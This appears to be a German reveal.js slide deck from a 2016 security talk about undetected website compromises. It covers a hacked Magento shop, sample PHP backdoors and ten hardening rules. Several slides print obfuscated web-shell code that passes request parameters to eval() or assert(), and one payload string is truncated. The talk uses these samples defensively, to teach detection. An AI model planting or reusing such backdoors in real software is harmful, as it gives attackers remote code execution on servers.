@@ -1,0 +1,324 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Deine Webseite ist gehackt und du hast es nicht gemerkt</title>
+
+		<meta name="author" content="Thomas Lohner">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+                
+		<link rel="stylesheet" href="css/reveal.min.css">
+		<link rel="stylesheet" href="css/theme/scale.css" id="theme">
+
+		<!-- For syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- If the query includes 'print-pdf', use the PDF print sheet -->
+		<script>
+			document.write( '<link rel="stylesheet" href="css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+        <div id="logo">
+            <img src="content/scale-logo-invers.svg" alt="ScaleCommerce Logo">
+        </div>
+		<div class="reveal">
+
+<!-- Any section element inside of this container is displayed as a slide -->
+<div class="slides">
+<section>
+  <h2>Deine Webseite ist <span class="highlight">gehackt</span> und du hast es <span class="highlight2">nicht gemerkt</span></h2>
+  <p>Thomas Lohner, Code.Talks 2016</p>
+</section>
+
+<section>
+  <h2>Ein ganz normaler Shop-Umzug, <span class="highlight">bis...</span></h2>
+</section>
+
+<section>
+  <h3>... im Access-Log <span class="highlight">erschien:</span></h3>
+<pre style="font-size:85%"><code data-trim data-noescape>
+GET /default-page/how-to-get-more-instagram-followers/
+    HTTP/1.1" 200 7481 "-" " Mozilla/5.0 (compatible; 
+    Googlebot/2.1; +http://www.google.com/bot.html)
+</code></pre>
+</section>
+
+<section style="text-align: left; font-size: 150%">
+  <p><span class="highlight">Ich so</span> <q>"Äh Leute, sagt euch diese URL irgendwas?"</q><p>
+  <br/>
+  <p class="fragment" data-fragment-index="1"><span class="highlight2">Kunde so</span> <q>"WTF??!!"</q></p>
+</section>
+
+<section style="text-align: left; font-size: 150%">
+  <p><span class="highlight">Ich so</span> <q>"Ok, dann lass uns mal ein Backup einspielen"</q><p>
+  <br/>
+  <p class="fragment" data-fragment-index="1"><span class="highlight2">Kunde so</span> <q>"Ähm, naja, also... ^^"</q></p>
+</section>
+
+<section>
+  <h2>Das älteste Backup war <span class="highlight2">3 Monate</span> alt und auch schon <span class="highlight">infiziert.</span></h2>
+</section>
+
+<section>
+  <h2>Der <span class="highlight2">Neubau</span> des<br>Magento- Setups mit allen Extensions hat<br/><span class="highlight">30 PT</span> gekostet.</h2>
+</section>
+
+<section>
+  <h2><span class="highlight2">Einzelschicksal?</span><br>Oder gibt es eine<br><span class="highlight">Dunkelziffer</span> von gehackten Webseiten?</h2>
+</section>
+
+<section>
+  <img src="content/Software.png">
+</section>
+
+<section>
+<h2>Beispiele PHP <span class="highlight">Remote Code Execution</span></h2>
+</section>                              
+
+
+<section>
+<pre style="font-size:110%"><code data-trim data-noescape>
+$a = "b".""."as"."e"."".""."6"."4"."_".
+"de".""."c"."o". ""."d"."e"; 
+
+assert($a('CmV2YWwoIlx4NjVceDc2XHg2MVx
+4NkNceDI4XHg2N1x4N0FceDY5XHg2RVx4NjZce
+DZDXHg2MVx4NzRceDY1XHgyOFx4NjJceDYxXHg
+3M1x4NjVceDM2XHgzNFx4NUZceDY0XHg2NVx4N
+25OMUl5U...'));
+</code></pre>
+</section>                              
+
+<section>
+<pre style="font-size:100%"><code data-trim data-noescape>
+$wcoa15="adet6pc_o4bs" ;
+$qbj4=strtolower($wcoa15[10].$wcoa15[0]
+.$wcoa15[11].$wcoa15[2].$wcoa15[4] ...); 
+$vuid2 =strtoupper($wcoa15[7].$wcoa15[5].
+$wcoa15[8]. $wcoa15[11]. $wcoa15[3] ) ;
+if ( isset(${$vuid2 } ['n23f412']))
+{ eval ($qbj4( ${ $vuid2} ['n23f412' ] ) ) ;
+</code></pre>
+</section>                              
+
+<section>
+<pre style="font-size:90%"><code data-trim data-noescape>
+  if ( $_REQUEST["array"] )
+  {
+      @assert(base64_decode($_REQUEST["array"]));
+
+      //debug message
+      echo "Array sort completed";
+
+      exit();
+  }
+</code></pre>
+</section>                              
+
+<section>
+<h2><span class="highlight2">eval()</span> und <span class="highlight2">assert()</span> sind <span class="highlight">böse</span></h2>
+</section> 
+                             
+<section>
+<h2>Oder ihr findet</h2>
+<pre style="font-size:110%"><code data-trim data-noescape>
+fwrite($f, $_POST['data']);
+
+include($f);
+
+unlink($f);
+</code></pre>
+</section>                              
+
+<section>
+<h2>Infizierte Bilder</h2>
+<pre><code data-trim data-noescape>
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj(1).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj(13).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj_php(3).gif
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj(5).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj(4).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj(10).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj.jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj(2).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj_php;(6).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj(6).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj_php;(4).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj_php;(1).jpg
+* Win.Trojan.Hide-1 in /html/oxid/out/fck_pictures/tj_php;(2).jpg
+</code></pre>
+</section>                              
+
+<section>
+<h2><span class="highlight2">10 Rules</span> how not<br>to <span class="highlight">fuck up</span></h2>
+</section>
+
+<section>
+<h2>#1 Malware-Scanner</h2>
+<ul style="line-height:1.7;">
+<li><a href="https://github.com/nbs-system/php-malware-finder">github.com/nbs-system/php-malware-finder</a></li>
+<li><a href="https://github.com/planet-work/php-malware-scanner/">github.com/planet-work/php-malware-scanner/</a></li>
+<li>Alternativ: Virenscanner</li>
+</ul>
+</section>                              
+
+<section>
+<h2>#2 Web Application Firewall</h2>
+<ul style="line-height:1.7;">
+<li>mod_security</li>
+<li>nginx-naxsi</li>
+</ul>
+</section>                              
+
+<section>
+<h2>#3 FTP ist <span class="highlight">böse</span></h2>
+<ul style="line-height:1.7;">
+<li>Häufigste Einbruchstelle <span class="highlight2">ever</span></li>
+<li>unverschlüsselte Passwortübertragung</li>
+<li>Fix: SFTP (via ssh)</li>
+</ul>
+</section>
+
+<section>
+<h2>#4 All-In-One Server<span class="highlight">-Schleuder</span></h2>
+<ul style="line-height:1.7;">
+<li><span class="highlight2">billiger:</span> Ja</li>
+<li>geiler: <span class="highlight">Nein!</span></li>
+</ul>
+</section>                              
+
+<section>
+<h2>#5 Updates</h2>
+<ul style="line-height:1.7;">
+  <li>Server-Updates: apticron (Ubuntu)</li>
+  <li>PHP/Java/Python/Ruby-Updates</li>
+  <li>Add-Ons: Wordpress, PHP MyAdmin usw.</li>
+</ul>
+</section>                              
+
+
+<section>
+<h2>#6 Information-Leaks</h2>
+<pre style="font-size:100%"><code data-trim data-noescape>
+curl -I www.meineseite.de
+
+HTTP/1.1 200 OK
+Date: Wed, 01 Jun 2016 13:49:52 GMT
+Server: Apache
+X-Powered-By: PHP/5.3.3
+Set-Cookie: language=0; path=/; httponly
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+</code></pre>
+</section>                              
+
+<section>
+<h2>#7 "Ich hab das schnell mal gemacht".php</h2>
+<ul style="line-height:1.7;">
+<li>SQL-Dumps</li>
+<li>CSV-Exporte</li>
+<li>Cronjobs</li>
+<li>Shellscripte</li>
+<li>Umsatz-Satistiken</li>
+</ul>
+</section>                              
+
+<section>
+<h2>#8 Zugriffsrechte</h2>
+<ul style="line-height:1.7;">
+  <li>chmod 777 <span class="highlight">Pfui!</span></li>
+  <li>Schreibzugriff nur wo nötig</li>
+  <li>Zugriff per htaccess verbieten</li>
+  </ul>
+</code>
+</section>                              
+
+<section>
+<h2>#9 Deployment / git?</h2>
+<ul style="line-height:1.7;">
+<li>"sauberes" DocRoot</li>
+<li>keine Live-Hotfixes</li>
+<li>Rollback</li>
+</ul>
+</section>                              
+
+
+<section>
+<h2>#10 Uffbasse!</h2>
+<ul style="line-height:1.7;">
+<li>Logging</li>
+<li>Monitoring (z.B. Port 6667 / irc)</li>
+</ul>
+</section>
+
+
+<section>
+<blockquote style="font-size:150%; line-height:150%;">Wir verletzen unsere Aufsichtspflicht, wenn wir unsere Websites nicht updaten und sicher halten!</blockquote>
+</section>                              
+
+<section>
+<blockquote style="font-size:150%; line-height:150%;">With websites comes responsibility. With ecommerce websites comes great responsibility.</blockquote>
+</section>                              
+
+<section>
+<h2>ScaleCommerce</h2>
+<img src="content/ScaleCommerce.png">
+</section>                              
+
+<section>
+<div style="float:left;">
+  <img src="content/lola.jpg">
+</div>
+<div style="float:right; text-align:left; line-height:2^^;">
+  <p style="font-size:150%">Thomas Lohner</p>
+  <p>ScaleCommerce</p>
+  <p style="font-size: 80%;">facebook.com/ThomasLohner</p>
+  <p style="font-size: 80%;">tl@scale.sc</p>
+  </div>
+</section>
+			</div>
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.min.js"></script>
+
+		<script>
+
+			// Full list of configuration options available here:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: false,
+				progress: true,
+				history: false,
+				center: true,
+
+				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+				transition: Reveal.getQueryHash().transition || 'none', // default/cube/page/concave/zoom/linear/fade/none
+
+				// Optional libraries used to extend on reveal.js
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
